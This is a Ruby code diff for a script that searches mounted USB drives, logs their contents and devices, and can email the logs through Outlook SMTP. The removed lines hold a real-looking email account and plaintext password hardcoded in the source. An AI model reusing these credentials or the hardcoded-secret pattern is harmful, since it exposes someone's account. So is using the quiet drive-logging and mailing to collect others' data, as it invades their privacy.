@@ -2,6 +2,7 @@
 
 require "fileutils"
 require 'net/smtp'
+require_relative 'emailSender.rb'
 
 def windows?
 	(/cygwin|mswin|mingw|bccwin|wince|emx/ =~ RbConfig::CONFIG["host_os"]) != nil
@@ -14,15 +15,16 @@ def linux?
 end
 
 src = "G:" if windows?
-dest = "C:\Users\Sabino\Descargas" if windows?
+dest = Dir.home() if windows?
 
 src = "/Volumes" if mac?
-dest = "/Users/Carlos/" if mac?
+dest = Dir.home() if mac?
 
 src = "/media" if linux?
-dest = "/home/carlos/" if linux?
+dest = Dir.home() if linux?
 
-pen = "ESD-USB"
+
+pen = ["ESD-USB","NSDATA"]
 
 localizePen = Dir.glob File.join(src,"*")
 #subDirPen = Dir.glob File.join(src,pen,"**/")
@@ -74,64 +76,16 @@ def search(src,pen)#dest
 	#end
 end
 
-def emailSender(text)
-filename = text
-# Read a file and encode it into base64 format
-filecontent = File.read(filename)
-encodedcontent = [filecontent].pack("m")   # base64
-
-marker = "AUNIQUEMARKER"
-
-body =<<EOF
-This is a test email to send an attachement.
-EOF
-
-# Define the main headers.
-part1 =<<EOF
-From: Private Person <me@fromdomain.net>
-To: A Test User <test@todmain.com>
-Subject: Sending Attachement
-MIME-Version: 1.0
-Content-Type: multipart/mixed; boundary=#{marker}
---#{marker}
-EOF
-
-# Define the message action
-part2 =<<EOF
-Content-Type: text/plain
-Content-Transfer-Encoding:8bit
-
-#{body}
---#{marker}
-EOF
-
-# Define the attachment section
-part3 =<<EOF
-Content-Type: multipart/mixed; name=\"#{filename}\"
-Content-Transfer-Encoding:base64
-Content-Disposition: attachment; filename="#{filename}"
-
-#{encodedcontent}
---#{marker}--
-EOF
-
-mailtext = part1 + part2 + part3
-
-# Let's put our code in safe area  
-
-yourDomain = 'localhost'
-yourAccountName = 'carl.riv.aro@outlook.com'
-yourPassword = 'crakpkp06061997@'
-fromAddress = 'carl.riv.aro@outlook.com'
-toAddress = 'carlosriveroaro7@gmail.com'
-
-smtp = Net::SMTP.new 'smtp-mail.outlook.com', 587
-smtp.enable_starttls
-smtp.start(yourDomain, yourAccountName, yourPassword, :login) do
-    smtp.send_message(mailtext, fromAddress, toAddress)
-end
+def keepSearching (src,pen,localizePen,logDevicesDir)
+	for usbDrive in pen
+		if usbDrive == "ESD-USB"
+			puts "El pen no esta en el pc"
+			log_file localizePen,"w+",logDevicesDir
+		end
+		search src,usbDrive
+	end
 end
 
-search src,pen
-log_file localizePen,"w+","Devices.txt"
-emailSender logUSBDir
+keepSearching src, pen, localizePen, logDevicesDir
+#emailSender logDevicesDir
+#emailSender logUSBDir
